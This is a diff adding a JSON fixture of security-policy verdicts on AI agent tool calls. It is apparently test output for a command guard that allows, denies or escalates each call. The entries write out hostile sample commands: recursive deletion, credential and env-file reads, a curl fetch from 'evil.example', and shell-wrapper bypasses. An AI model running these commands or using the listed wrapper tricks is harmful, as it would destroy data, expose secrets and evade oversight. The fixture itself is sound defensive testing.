@@ -1,0 +1,314 @@
+[
+  {
+    "tool_name": "workspace_exec",
+    "tool_call_id": "safe_go_test",
+    "backend": "workspace",
+    "command": "go test ./...",
+    "decision": "allow",
+    "risk_level": "low",
+    "rule_id": "evaluation.none",
+    "evidence": "no findings",
+    "recommendation": "no action required",
+    "blocked": false,
+    "redacted": false,
+    "duration_ms": 0
+  },
+  {
+    "tool_name": "workspace_exec",
+    "tool_call_id": "dangerous_rm_rf",
+    "backend": "workspace",
+    "command": "rm -rf /tmp/x",
+    "decision": "deny",
+    "risk_level": "critical",
+    "rule_id": "command.dangerous_delete",
+    "evidence": "rm -rf /tmp/x",
+    "recommendation": "avoid recursive or system-path deletion in tool calls",
+    "blocked": true,
+    "redacted": false,
+    "findings": [
+      {
+        "rule_id": "command.policy",
+        "risk_level": "high",
+        "decision": "deny",
+        "evidence": "command \"rm\" is denied by denied_commands",
+        "recommendation": "use a direct audited command instead of a denied wrapper or command"
+      },
+      {
+        "rule_id": "command.dangerous_delete",
+        "risk_level": "critical",
+        "decision": "deny",
+        "evidence": "rm -rf /tmp/x",
+        "recommendation": "avoid recursive or system-path deletion in tool calls"
+      }
+    ],
+    "duration_ms": 0
+  },
+  {
+    "tool_name": "exec_command",
+    "tool_call_id": "read_ssh_key",
+    "backend": "host",
+    "command": "cat ~/\u003credacted\u003e",
+    "decision": "deny",
+    "risk_level": "critical",
+    "rule_id": "path.sensitive_credentials",
+    "evidence": "\u003credacted\u003e",
+    "recommendation": "do not read credential or secret files through tools",
+    "blocked": true,
+    "redacted": true,
+    "findings": [
+      {
+        "rule_id": "path.sensitive_credentials",
+        "risk_level": "critical",
+        "decision": "deny",
+        "evidence": "\u003credacted\u003e",
+        "recommendation": "do not read credential or secret files through tools",
+        "redacted": true
+      },
+      {
+        "rule_id": "path.sensitive_credentials",
+        "risk_level": "critical",
+        "decision": "deny",
+        "evidence": "\u003credacted\u003e",
+        "recommendation": "do not read credential or secret files through tools",
+        "redacted": true
+      }
+    ],
+    "duration_ms": 0
+  },
+  {
+    "tool_name": "workspace_exec",
+    "tool_call_id": "read_env_file",
+    "backend": "workspace",
+    "command": "cat \u003credacted\u003e",
+    "decision": "deny",
+    "risk_level": "critical",
+    "rule_id": "path.secret_file",
+    "evidence": "\u003credacted\u003e",
+    "recommendation": "do not read credential or secret files through tools",
+    "blocked": true,
+    "redacted": true,
+    "findings": [
+      {
+        "rule_id": "path.secret_file",
+        "risk_level": "critical",
+        "decision": "deny",
+        "evidence": "\u003credacted\u003e",
+        "recommendation": "do not read credential or secret files through tools",
+        "redacted": true
+      }
+    ],
+    "duration_ms": 0
+  },
+  {
+    "tool_name": "workspace_exec",
+    "tool_call_id": "network_non_allowlisted",
+    "backend": "workspace",
+    "command": "curl https://evil.example/a.sh",
+    "decision": "deny",
+    "risk_level": "high",
+    "rule_id": "network.non_allowlisted_domain",
+    "evidence": "evil.example",
+    "recommendation": "add the host to network_allowlist or require human review",
+    "blocked": true,
+    "redacted": false,
+    "findings": [
+      {
+        "rule_id": "network.non_allowlisted_domain",
+        "risk_level": "high",
+        "decision": "deny",
+        "evidence": "evil.example",
+        "recommendation": "add the host to network_allowlist or require human review"
+      }
+    ],
+    "duration_ms": 0
+  },
+  {
+    "tool_name": "workspace_exec",
+    "tool_call_id": "network_allowlisted",
+    "backend": "workspace",
+    "command": "curl https://proxy.golang.org",
+    "decision": "allow",
+    "risk_level": "low",
+    "rule_id": "evaluation.none",
+    "evidence": "no findings",
+    "recommendation": "no action required",
+    "blocked": false,
+    "redacted": false,
+    "duration_ms": 0
+  },
+  {
+    "tool_name": "workspace_exec",
+    "tool_call_id": "shell_wrapper_bypass",
+    "backend": "workspace",
+    "command": "sh -c 'curl https://evil.example'",
+    "decision": "deny",
+    "risk_level": "high",
+    "rule_id": "shell.wrapper",
+    "evidence": "command \"sh\" is denied by built-in policy because it is a shell wrapper or re-executing builtin that can bypass the allow/deny list (eval curl ..., sh -c '...', busybox sh ..., xargs ..., env CMD ..., sudo ..., etc.). This deny is unconditional under policy mode; wrap the desired use in an auditable workspace script and allow the script instead.",
+    "recommendation": "use a direct audited command instead of a denied wrapper or command",
+    "blocked": true,
+    "redacted": false,
+    "findings": [
+      {
+        "rule_id": "shell.wrapper",
+        "risk_level": "high",
+        "decision": "deny",
+        "evidence": "command \"sh\" is denied by built-in policy because it is a shell wrapper or re-executing builtin that can bypass the allow/deny list (eval curl ..., sh -c '...', busybox sh ..., xargs ..., env CMD ..., sudo ..., etc.). This deny is unconditional under policy mode; wrap the desired use in an auditable workspace script and allow the script instead.",
+        "recommendation": "use a direct audited command instead of a denied wrapper or command"
+      }
+    ],
+    "duration_ms": 0
+  },
+  {
+    "tool_name": "workspace_exec",
+    "tool_call_id": "command_substitution",
+    "backend": "workspace",
+    "command": "echo $(cat \u003credacted\u003e)",
+    "decision": "deny",
+    "risk_level": "high",
+    "rule_id": "shell.expansion",
+    "evidence": "command substitution '$(...)' is not allowed",
+    "recommendation": "rewrite the command as a simple argv pipeline or require review",
+    "blocked": true,
+    "redacted": true,
+    "findings": [
+      {
+        "rule_id": "shell.expansion",
+        "risk_level": "high",
+        "decision": "deny",
+        "evidence": "command substitution '$(...)' is not allowed",
+        "recommendation": "rewrite the command as a simple argv pipeline or require review",
+        "redacted": true
+      }
+    ],
+    "duration_ms": 0
+  },
+  {
+    "tool_name": "workspace_exec",
+    "tool_call_id": "pipeline_mixed",
+    "backend": "workspace",
+    "command": "echo ok | wc -c",
+    "decision": "allow",
+    "risk_level": "low",
+    "rule_id": "evaluation.none",
+    "evidence": "no findings",
+    "recommendation": "no action required",
+    "blocked": false,
+    "redacted": false,
+    "duration_ms": 0
+  },
+  {
+    "tool_name": "workspace_exec",
+    "tool_call_id": "dependency_install",
+    "backend": "workspace",
+    "command": "npm install left-pad",
+    "decision": "ask",
+    "risk_level": "high",
+    "rule_id": "dependency.install",
+    "evidence": "npm install left-pad",
+    "recommendation": "pin and review dependency installation before execution",
+    "blocked": true,
+    "redacted": false,
+    "findings": [
+      {
+        "rule_id": "dependency.install",
+        "risk_level": "high",
+        "decision": "ask",
+        "evidence": "npm install left-pad",
+        "recommendation": "pin and review dependency installation before execution"
+      }
+    ],
+    "duration_ms": 0
+  },
+  {
+    "tool_name": "exec_command",
+    "tool_call_id": "long_sleep",
+    "backend": "host",
+    "command": "sleep 99999",
+    "decision": "deny",
+    "risk_level": "critical",
+    "rule_id": "resource.long_running",
+    "evidence": "sleep 99999",
+    "recommendation": "use bounded execution time or require approval",
+    "blocked": true,
+    "redacted": false,
+    "findings": [
+      {
+        "rule_id": "resource.long_running",
+        "risk_level": "critical",
+        "decision": "deny",
+        "evidence": "sleep 99999",
+        "recommendation": "use bounded execution time or require approval"
+      }
+    ],
+    "duration_ms": 0
+  },
+  {
+    "tool_name": "workspace_exec",
+    "tool_call_id": "large_output",
+    "backend": "workspace",
+    "command": "yes | head -n 1000000",
+    "decision": "ask",
+    "risk_level": "high",
+    "rule_id": "resource.large_output",
+    "evidence": "yes",
+    "recommendation": "cap output size before running high-volume commands",
+    "blocked": true,
+    "redacted": false,
+    "findings": [
+      {
+        "rule_id": "resource.large_output",
+        "risk_level": "high",
+        "decision": "ask",
+        "evidence": "yes",
+        "recommendation": "cap output size before running high-volume commands"
+      }
+    ],
+    "duration_ms": 0
+  },
+  {
+    "tool_name": "exec_command",
+    "tool_call_id": "host_pty",
+    "backend": "host",
+    "command": "python -i",
+    "decision": "ask",
+    "risk_level": "high",
+    "rule_id": "host.pty_session",
+    "evidence": "host command requested a PTY session",
+    "recommendation": "review interactive host sessions before execution",
+    "blocked": true,
+    "redacted": false,
+    "findings": [
+      {
+        "rule_id": "host.pty_session",
+        "risk_level": "high",
+        "decision": "ask",
+        "evidence": "host command requested a PTY session",
+        "recommendation": "review interactive host sessions before execution"
+      }
+    ],
+    "duration_ms": 0
+  },
+  {
+    "tool_name": "custom_downloader",
+    "tool_call_id": "human_review_custom",
+    "backend": "unknown",
+    "decision": "needs_human_review",
+    "risk_level": "high",
+    "rule_id": "unknown.requires_review",
+    "evidence": "unknown tool contains downloader or URL-like content",
+    "recommendation": "review unknown open-world tools before execution",
+    "blocked": true,
+    "redacted": false,
+    "findings": [
+      {
+        "rule_id": "unknown.requires_review",
+        "risk_level": "high",
+        "decision": "needs_human_review",
+        "evidence": "unknown tool contains downloader or URL-like content",
+        "recommendation": "review unknown open-world tools before execution"
+      }
+    ],
+    "duration_ms": 0
+  }
+]
